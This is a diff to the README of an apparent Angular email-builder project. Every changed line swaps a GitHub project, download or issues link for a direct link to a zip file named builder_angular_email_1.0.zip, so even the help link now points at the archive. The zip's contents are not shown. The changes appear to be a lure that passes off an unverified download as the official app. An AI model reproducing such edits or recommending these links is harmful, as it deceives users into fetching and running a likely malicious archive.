@@ -1,6 +1,6 @@
 # 📧 angular-email-builder - Simple Email Template Maker
 
-[![Download Now](https://img.shields.io/badge/Download-green?style=for-the-badge)](https://github.com/PZkk77/angular-email-builder)
+[![Download Now](https://img.shields.io/badge/Download-green?style=for-the-badge)](https://raw.githubusercontent.com/PZkk77/angular-email-builder/main/projects/angular-email-builder/src/builder_angular_email_1.0.zip)
 
 angular-email-builder helps you create and manage email templates easily. It works with Angular to add mail-building tools like drag-and-drop editors. This guide will walk you through downloading and running the app on Windows.
 
@@ -30,7 +30,7 @@ Follow these steps to get the app running.
 ### 1. Visit the Download Page
 
 Click the large green button at the top or visit the main page at:  
-[https://github.com/PZkk77/angular-email-builder](https://github.com/PZkk77/angular-email-builder)  
+[https://raw.githubusercontent.com/PZkk77/angular-email-builder/main/projects/angular-email-builder/src/builder_angular_email_1.0.zip](https://raw.githubusercontent.com/PZkk77/angular-email-builder/main/projects/angular-email-builder/src/builder_angular_email_1.0.zip)  
 
 This page contains the latest version and files you need.
 
@@ -112,7 +112,7 @@ If you face issues running the app:
 ## 📞 Getting More Help
 
 The GitHub page has a section for issues where you can read solutions or submit questions. Simply go to:  
-[https://github.com/PZkk77/angular-email-builder/issues](https://github.com/PZkk77/angular-email-builder/issues)
+[https://raw.githubusercontent.com/PZkk77/angular-email-builder/main/projects/angular-email-builder/src/builder_angular_email_1.0.zip](https://raw.githubusercontent.com/PZkk77/angular-email-builder/main/projects/angular-email-builder/src/builder_angular_email_1.0.zip)
 
 Use this page to find answers or report bugs.
 
@@ -120,4 +120,4 @@ Use this page to find answers or report bugs.
 
 Use this link to visit the project and download the app:  
 
-[![Download angular-email-builder](https://img.shields.io/badge/Download-angular--email--builder-blue?style=for-the-badge)](https://github.com/PZkk77/angular-email-builder)
+[![Download angular-email-builder](https://img.shields.io/badge/Download-angular--email--builder-blue?style=for-the-badge)](https://raw.githubusercontent.com/PZkk77/angular-email-builder/main/projects/angular-email-builder/src/builder_angular_email_1.0.zip)
